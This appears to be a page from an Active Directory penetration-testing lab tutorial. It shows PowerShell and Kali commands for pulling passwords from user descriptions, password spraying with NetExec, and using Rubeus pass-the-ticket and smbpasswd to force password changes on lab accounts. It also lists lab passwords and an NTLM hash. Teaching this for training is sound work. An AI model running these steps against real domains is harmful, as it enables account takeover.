@@ -1,0 +1,197 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Status Password Must Change</title>
+    <link rel="stylesheet" href="../styles.css"> <!-- Adjust the path as needed -->
+</head>
+<body>
+
+    <div class="content">
+        <h2>Password Must Change PowerShell</h2>
+        <p>When we were looking at users we found some passwords in descriptions.</p>
+        <p>If you do not remember, we can look below and see the passwords again by using DSQuery, we first saw the passwords when looking at users through Kali</p>
+                
+        <div class="powershell-terminal-wrapper">
+            <div class="powershell-terminal">
+                <div class="terminal-header">
+                    <span>PowerShell Terminal</span>
+                    <div class="terminal-controls">
+                        <button class="minimize">-</button>
+                        <button class="maximize">+</button>
+                        <button class="close">X</button>
+                    </div>
+                </div>
+                <pre>   
+# Import the Active Directory module if not already imported
+Import-Module ActiveDirectory
+
+# Get all user accounts from Active Directory
+$users = Get-ADUser -Filter * -Properties * -Server "maraudersec.local"
+
+# Loop through each user and display their information, only if Description is not empty or null
+foreach ($user in $users) {
+    if (![string]::IsNullOrEmpty($user.Description)) {
+        Write-Host "User: $($user.SamAccountName)"
+        Write-Host "Name: $($user.Name)"
+        Write-Host "Display Name: $($user.DisplayName)"
+        Write-Host "Email: $($user.EmailAddress)"
+        Write-Host "Last Logon: $($user.LastLogonDate)"
+        Write-Host "Account Status: $($user.Enabled)"
+        Write-Host "Description: $($user.Description)"
+        Write-Host "-----------------------------------"
+    }
+}
+                </pre>
+            </div>
+        </div>
+         <div class="image-container">
+             <img src="../images/PowerShellDescription.jpg" alt="DSQuery PowerShell Description">
+         </div>    
+        <p>Normally we would not just brute force those passwords, we would see who they belong to and see if we can login with them. However, for training purposes we brute forced the users above. <b>Do not change both passwords</b> we will want to leave one for Linux abuse.</p>
+        <p>Now that we have 2 passwords, lets see if those are valid, or if their password must change at next logon event.</p>
+
+        <div class="powershell-terminal-wrapper">
+            <div class="powershell-terminal">
+                <div class="terminal-header">
+                    <span>PowerShell Terminal</span>
+                    <div class="terminal-controls">
+                        <button class="minimize">-</button>
+                        <button class="maximize">+</button>
+                        <button class="close">X</button>
+                    </div>
+                </div>
+                <pre>    
+Get-ADUser -LDAPFilter "(pwdLastSet=0)" | Select SamAccountName,distinguishedName
+                </pre>
+            </div>
+        </div>                       
+         <div class="image-container">
+             <img src="../images/PowerShellPasswordMustChange.jpg" alt="Hash Cracked">
+         </div>     
+        <div class="powershell-terminal-wrapper">
+            <div class="powershell-terminal">
+                <div class="terminal-header">
+                    <span>PowerShell Terminal</span>
+                    <div class="terminal-controls">
+                        <button class="minimize">-</button>
+                        <button class="maximize">+</button>
+                        <button class="close">X</button>
+                    </div>
+                </div>
+                <pre>          
+runas.exe /user:bob.builder C:\Windows\System32\cmd.exe
+                </pre>
+            </div>
+        </div>
+        <div class="image-container">
+             <img src="../images/runas.jpg" alt="RunAs Password Must Change">
+         </div>       
+
+        <p>As shown above when we try to use bob.builder with runas we see that the user's password must be changed before signing in.</p>
+        <p>To change the password within windows, you could try and utilize something like net user bob.builder P@ssw0rd! /domain which would change their password, however if you do not have rights for that then you may have to use Remote Desktop Protocol to change the users password.</p>
+        <br>
+        <p>Remember with Rubeus.exe we could also run Invoke-Rubeus -command " " and put the same command in. To conduct the attack from PowerShell we first need to utilize the NTLM hash of the password of the account we are attacking. Remember bob.builder's password is RockYou123!. There are multiple ways to find the NTLM hash, such as https://codebeautify.org/ntlm-hash-generator</p>
+        <p>Once you have the hash you need to request a Ticket Granting Ticket and store that within a kirbi file and also utilize Pass-the-Ticket which will store the ticket in klist.</p>
+        <p>Once you have the ticket you can call for that .kirbi file and change the password of the user
+        <div class="powershell-terminal-wrapper">
+            <div class="powershell-terminal">
+                <div class="terminal-header">
+                    <span>PowerShell Terminal</span>
+                    <div class="terminal-controls">
+                        <button class="minimize">-</button>
+                        <button class="maximize">+</button>
+                        <button class="close">X</button>
+                    </div>
+                </div>
+                <pre>   
+#Request Ticket Granting Ticket
+.\rubeus.exe asktgt /domain:maraudersec.local /user:bob.builder /rc4:21F404D4E9F33B8BE342EB48197E3F19 /ptt /outfile:bob.kirbi /changepw
+#Using ticket to change password for Bob.Builder
+.\rubeus.exe changepw /new:1qaz2wsx!QAZ@WSX /ticket:bob.kirbi /dc:dc1.maraudersec.local
+                </pre>
+            </div>
+        </div>
+          <div class="image-container">
+             <img src="../images/bobptt.jpg" alt="Pass-the-Ticket">
+         </div>
+          <div class="image-container">
+             <img src="../images/bobchangepw.jpg" alt="Change Password">
+         </div>
+         <p>Now that we have changed bob.builder's password lets try to utilize runas.exe again.</p>
+        <div class="powershell-terminal-wrapper">
+            <div class="powershell-terminal">
+                <div class="terminal-header">
+                    <span>PowerShell Terminal</span>
+                    <div class="terminal-controls">
+                        <button class="minimize">-</button>
+                        <button class="maximize">+</button>
+                        <button class="close">X</button>
+                    </div>
+                </div>
+                <pre>          
+runas.exe /user:bob.builder C:\Windows\System32\cmd.exe
+                </pre>
+            </div>
+        </div>
+          <div class="image-container">
+             <img src="../images/bobrunas.jpg" alt="RunAs Bob">
+         </div>        
+        <p>We get a differnet error, which is much more likley, bob.builder does not have permission to logon to the DC. However, that error lets us know that the password is now changed.</p>
+        <h2>Using Linux</h2>   
+        <p>Now that we have used Rebeus to change the password, we can now use Kali.</p>
+        <p>Another user had status password must change, lets find them with Kali this time utilize NetExec.</p>
+         <div class="kali-terminal-wrapper">
+            <div class="kali-terminal">
+                <div class="terminal-header">
+                    <span>Kali Terminal</span>
+                    <div class="terminal-controls">
+                        <button class="minimize">-</button>
+                        <button class="maximize">+</button>
+                        <button class="close">X</button>
+                    </div>
+                </div>
+                <pre>
+nxc smb maraudersec.local -u usernames.txt -p 'P@ssw0rd!456' --continue-on-success | grep -is password
+                </pre>
+            </div>
+        </div>      
+          <div class="image-container">
+             <img src="../images/charlie.jpg" alt="Charlie Brown">
+         </div>                 
+         <p>Now that we have found the user and password, lets change their password from Kali utilizing Imapcket</p>
+         <div class="kali-terminal-wrapper">
+            <div class="kali-terminal">
+                <div class="terminal-header">
+                    <span>Kali Terminal</span>
+                    <div class="terminal-controls">
+                        <button class="minimize">-</button>
+                        <button class="maximize">+</button>
+                        <button class="close">X</button>
+                    </div>
+                </div>
+                <pre>
+smbpasswd -r $DC -U maraudersec.local/charlie.brown
+#Make sure to put in old password and new password, then test
+nxc smb maraudersec.local -u charlie.brown -p 'P@ssw0rd!'
+                </pre>
+            </div>
+        </div>  
+          <div class="image-container">
+             <img src="../images/passwdchangeall.jpg" alt="Passwords Changed">
+         </div>     
+    <script>
+        function copyToClipboard() {
+            var terminalContent = document.querySelector('.kali-terminal pre').textContent;
+            var textArea = document.createElement('textarea');
+            textArea.value = terminalContent;
+            document.body.appendChild(textArea);
+            textArea.select();
+            document.execCommand('copy');
+            document.body.removeChild(textArea);
+            alert("Copied to clipboard!");
+        }
+    </script>
+</body>
+</html>
